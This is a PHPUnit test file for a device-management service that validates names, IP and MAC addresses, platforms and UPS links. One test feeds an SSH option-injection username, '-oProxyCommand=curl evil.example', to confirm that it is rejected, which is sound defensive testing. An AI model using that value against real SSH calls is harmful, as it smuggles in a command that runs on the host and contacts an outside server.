<?php

declare(strict_types=1);

namespace EvilStudio\HAT\Tests\Unit\Service\Application;

use Doctrine\ORM\EntityManagerInterface;
use EvilStudio\HAT\Contract\DevicePlatform;
use EvilStudio\HAT\Exception\EntityAlreadyExists;
use EvilStudio\HAT\Exception\EntityNotFound;
use EvilStudio\HAT\Repository\DeviceRepository;
use EvilStudio\HAT\Repository\UpsRepository;
use EvilStudio\HAT\Service\Application\DeviceService;
use EvilStudio\HAT\Tests\Support\EntityTestHelperTrait;
use InvalidArgumentException;
use PHPUnit\Framework\TestCase;

class DeviceServiceTest extends TestCase
{
    use EntityTestHelperTrait;

    public function testCreateDeviceRejectsBlankName(): void
    {
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $deviceRepository->expects($this->never())->method('findOneByName');

        $service = new DeviceService(
            $this->createMock(EntityManagerInterface::class),
            $deviceRepository,
            $this->createMock(UpsRepository::class)
        );

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage('Device name cannot be empty.');

        $service->createDevice('   ', '10.0.0.1', '00:11:22:33:44:55', DevicePlatform::LINUX->value);
    }

    public function testCreateDeviceRejectsNegativeThreshold(): void
    {
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $deviceRepository->expects($this->never())->method('findOneByName');

        $service = new DeviceService(
            $this->createMock(EntityManagerInterface::class),
            $deviceRepository,
            $this->createMock(UpsRepository::class)
        );

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage('UPS low battery runtime threshold cannot be negative.');

        $service->createDevice(
            'node-1',
            '10.0.0.1',
            '00:11:22:33:44:55',
            DevicePlatform::LINUX->value,
            null,
            -60
        );
    }

    public function testCreateDeviceThrowsForUnsupportedPlatform(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->once())->method('findOneByName')->with('node-1')->willReturn(null);
        $entityManager->expects($this->never())->method('persist');
        $entityManager->expects($this->never())->method('flush');

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage("Unsupported platform 'unsupported-platform'");

        $service->createDevice('node-1', '10.0.0.10', '00:11:22:33:44:55', 'unsupported-platform');
    }

    public function testCreateDeviceThrowsForInvalidIp(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->never())->method('findOneByName');
        $entityManager->expects($this->never())->method('persist');

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage("'999.0.0.1' is not a valid IP address.");

        $service->createDevice('node-1', '999.0.0.1', '00:11:22:33:44:55', DevicePlatform::GENERIC->value);
    }

    public function testCreateDeviceThrowsForInvalidMac(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->never())->method('findOneByName');
        $entityManager->expects($this->never())->method('persist');

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage("'not-a-mac' is not a valid MAC address");

        $service->createDevice('node-1', '10.0.0.10', 'not-a-mac', DevicePlatform::GENERIC->value);
    }

    public function testUpdateDeviceRejectsInvalidIpBeforeTouchingTheEntity(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->never())->method('findById');
        $entityManager->expects($this->never())->method('flush');

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage("'nope' is not a valid IP address.");

        $service->updateDevice(1, 'node-1', 'nope', '00:11:22:33:44:55', DevicePlatform::GENERIC->value);
    }

    public function testCreateDeviceTrimsSurroundingWhitespaceFromIpAndMac(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->once())->method('findOneByName')->with('node-1')->willReturn(null);

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
        $device = $service->createDevice(
            'node-1',
            '  10.0.0.10  ',
            "\t00:11:22:33:44:55\n",
            DevicePlatform::GENERIC->value
        );

        $this->assertSame('10.0.0.10', $device->getIp());
        $this->assertSame('00:11:22:33:44:55', $device->getMac());
    }

    public function testCreateDeviceThrowsWhenNameAlreadyExists(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->once())
            ->method('findOneByName')
            ->with('node-1')
            ->willReturn($this->createDeviceEntity(1, 'node-1'));

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(EntityAlreadyExists::class);
        $this->expectExceptionMessage("Device with name 'node-1' already exists.");

        $service->createDevice('node-1', '10.0.0.10', '00:11:22:33:44:55', DevicePlatform::GENERIC->value);
    }

    public function testCreateDeviceThrowsWhenUpsIdDoesNotExist(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->once())->method('findOneByName')->with('node-1')->willReturn(null);
        $upsRepository->expects($this->once())->method('findById')->with(99)->willReturn(null);

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(EntityNotFound::class);
        $this->expectExceptionMessage("UPS with id '99' not found.");

        $service->createDevice(
            'node-1',
            '10.0.0.10',
            '00:11:22:33:44:55',
            DevicePlatform::GENERIC->value,
            upsId: 99
        );
    }

    public function testCreateDevicePersistsResolvedEntity(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);
        $ups = $this->createUpsEntity(1, 'Main UPS', 'ups-main', 'ups.local');

        $deviceRepository->expects($this->once())->method('findOneByName')->with('node-1')->willReturn(null);
        $upsRepository->expects($this->once())->method('findById')->with(1)->willReturn($ups);
        $entityManager->expects($this->once())->method('persist');
        $entityManager->expects($this->once())->method('flush');

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
        $device = $service->createDevice(
            'node-1',
            '10.0.0.10',
            '00:11:22:33:44:55',
            DevicePlatform::DEBIAN->value,
            'root',
            300,
            1
        );

        $this->assertSame('node-1', $device->getName());
        $this->assertSame(DevicePlatform::DEBIAN->value, $device->getPlatform());
        $this->assertSame('root', $device->getUsername());
        $this->assertSame(300, $device->getUpsLowBatteryRuntimeThreshold());
        $this->assertSame($ups, $device->getUps());
    }

    public function testGetDeviceByNameThrowsWhenMissing(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->once())->method('findOneByName')->with('missing')->willReturn(null);

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(EntityNotFound::class);
        $this->expectExceptionMessage("Device with name 'missing' not found.");

        $service->getDeviceByName('missing');
    }

    public function testUpdateDeviceThrowsWhenDeviceIdDoesNotExist(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);

        $deviceRepository->expects($this->once())->method('findById')->with(77)->willReturn(null);

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(EntityNotFound::class);
        $this->expectExceptionMessage("Device with id '77' not found.");

        $service->updateDevice(77, 'node-1', '10.0.0.10', '00:11:22:33:44:55', DevicePlatform::GENERIC->value);
    }

    public function testUpdateDeviceThrowsWhenNameBelongsToAnotherDevice(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);
        $currentDevice = $this->createDeviceEntity(1, 'node-1');
        $otherDevice = $this->createDeviceEntity(2, 'node-2');

        $deviceRepository->expects($this->once())->method('findById')->with(1)->willReturn($currentDevice);
        $deviceRepository->expects($this->once())->method('findOneByName')->with('node-2')->willReturn($otherDevice);

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        $this->expectException(EntityAlreadyExists::class);
        $this->expectExceptionMessage("Device with name 'node-2' already exists.");

        $service->updateDevice(1, 'node-2', '10.0.0.11', '00:11:22:33:44:66', DevicePlatform::LINUX->value);
    }

    public function testUpdateDeviceLeavesTheEntityUntouchedWhenTheUpsCannotBeResolved(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);
        $currentDevice = $this->createDeviceEntity(1, 'node-1', '10.0.0.10', '00:11:22:33:44:55');

        $deviceRepository->expects($this->once())->method('findById')->with(1)->willReturn($currentDevice);
        $deviceRepository->expects($this->once())->method('findOneByName')->willReturn($currentDevice);
        $upsRepository->expects($this->once())->method('findById')->with(99)->willReturn(null);
        $entityManager->expects($this->never())->method('flush');

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);

        try {
            $service->updateDevice(
                1,
                'node-renamed',
                '10.9.9.9',
                'aa:bb:cc:dd:ee:ff',
                DevicePlatform::UBUNTU->value,
                null,
                null,
                99
            );
            $this->fail('Expected EntityNotFound for the unresolvable UPS id.');
        } catch (EntityNotFound) {
            // The managed entity must not carry a half-applied update, because a
            // later flush anywhere in the process would persist it.
            $this->assertSame('node-1', $currentDevice->getName());
            $this->assertSame('10.0.0.10', $currentDevice->getIp());
            $this->assertSame('00:11:22:33:44:55', $currentDevice->getMac());
        }
    }

    public function testUpdateDeviceRejectsUsernameThatWouldBeParsedAsAnSshOption(): void
    {
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $deviceRepository->expects($this->never())->method('findById');

        $service = new DeviceService(
            $this->createMock(EntityManagerInterface::class),
            $deviceRepository,
            $this->createMock(UpsRepository::class)
        );

        $this->expectException(InvalidArgumentException::class);
        $this->expectExceptionMessage('is not a valid SSH username');

        $service->updateDevice(
            1,
            'node-1',
            '10.0.0.10',
            '00:11:22:33:44:55',
            DevicePlatform::LINUX->value,
            '-oProxyCommand=curl evil.example'
        );
    }

    public function testCreateDeviceTreatsBlankUsernameAsUnset(): void
    {
        $entityManager = $this->createStub(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $deviceRepository->expects($this->once())->method('findOneByName')->willReturn(null);

        $service = new DeviceService($entityManager, $deviceRepository, $this->createStub(UpsRepository::class));
        $device = $service->createDevice(
            'node-1',
            '10.0.0.10',
            '00:11:22:33:44:55',
            DevicePlatform::LINUX->value,
            '   '
        );

        $this->assertNull($device->getUsername());
    }

    public function testUpdateDeviceFlushesWhenUsingCurrentDeviceName(): void
    {
        $entityManager = $this->createMock(EntityManagerInterface::class);
        $deviceRepository = $this->createMock(DeviceRepository::class);
        $upsRepository = $this->createMock(UpsRepository::class);
        $currentDevice = $this->createDeviceEntity(1, 'node-1');
        $ups = $this->createUpsEntity(5, 'Backup UPS', 'ups-backup', 'ups-backup.local');

        $deviceRepository->expects($this->once())->method('findById')->with(1)->willReturn($currentDevice);
        $deviceRepository->expects($this->once())->method('findOneByName')->with('node-1')->willReturn($currentDevice);
        $upsRepository->expects($this->once())->method('findById')->with(5)->willReturn($ups);
        $entityManager->expects($this->once())->method('flush');

        $service = new DeviceService($entityManager, $deviceRepository, $upsRepository);
        $updated = $service->updateDevice(
            1,
            'node-1',
            '10.0.0.12',
            '00:11:22:33:44:77',
            DevicePlatform::UBUNTU->value,
            'admin',
            600,
            5
        );

        $this->assertSame('10.0.0.12', $updated->getIp());
        $this->assertSame(DevicePlatform::UBUNTU->value, $updated->getPlatform());
        $this->assertSame('admin', $updated->getUsername());
        $this->assertSame(600, $updated->getUpsLowBatteryRuntimeThreshold());
        $this->assertSame($ups, $updated->getUps());
    }
}
